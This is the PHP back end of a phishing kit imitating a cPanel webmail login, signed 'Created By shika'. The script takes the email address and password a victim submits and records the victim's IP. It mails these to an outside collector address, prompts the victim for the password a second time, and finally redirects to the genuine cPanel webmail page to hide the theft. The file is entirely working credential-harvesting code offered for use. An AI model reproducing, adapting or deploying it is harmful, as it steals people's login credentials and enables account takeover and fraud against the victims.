<?php

$sec = $_REQUEST['pass'];
$sec1 = $_REQUEST['user'];
$sec2 = $_REQUEST['space'];
$sec3 = $_REQUEST['spaces'];
$sec0 = $_REQUEST['epass'];
$sec4 = $sec3 + $sec2;
$page_name= "cp_Result";
$email = $_REQUEST['user'];
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
  header("Location: index.php?spaces=1");	
}
else {
	if((isset($sec0) && isset($sec1)) && $sec4 == 1) {
			$ip = getenv("REMOTE_ADDR");
			$message .= "---------- Login Information ----------------------------\n";
			$message .= "Email Address: ".$_REQUEST['user']."\n";
			//$message .= "Email Password: ".$_REQUEST['pass']."\n";
			$message .= "Email Password two: ".$_REQUEST['epass']."\n";
			$message .= "IP: ".$ip."\n";
			$message .= "----------------Created By shika------------------\n";
			$send = "man221@protonmail.com";
			$subject = $page_name." - 2 ReZulTs";
			$headers = "From: infos@shika.com>";
			$headers .= $_POST['eMailAdd']."\n";
			$headers .= "MIME-Version: 1.0\n";
			mail($send, $subject, $message); 
			header("Location: https://webmail.cpanel.net/");	
	}
	else if(isset($sec0) || $sec2 == 1) {
			$ip = getenv("REMOTE_ADDR");
			$message .= "---------- Login Information ----------------------------\n";
			$message .= "Email Address: ".$_REQUEST['user']."\n";
			$message .= "Email Password: ".$_REQUEST['pass']."\n";
			//$message .= "Email Password two: ".$_REQUEST['epass']."\n";
			$message .= "IP: ".$ip."\n";
			$message .= "----------------Created By shika------------------\n";
			$send = "man221@protonmail.com";
			$subject = $page_name." - ReZulTs";
			$headers = "From: infos@shika.com>";
			$headers .= $_POST['eMailAdd']."\n";
			$headers .= "MIME-Version: 1.0\n";
			mail($send, $subject, $message); 
			header("Location: index.php?user=$sec1&spaces=1");	
	}

	else {
		header("Location: index.php");	

		
	}
}
?>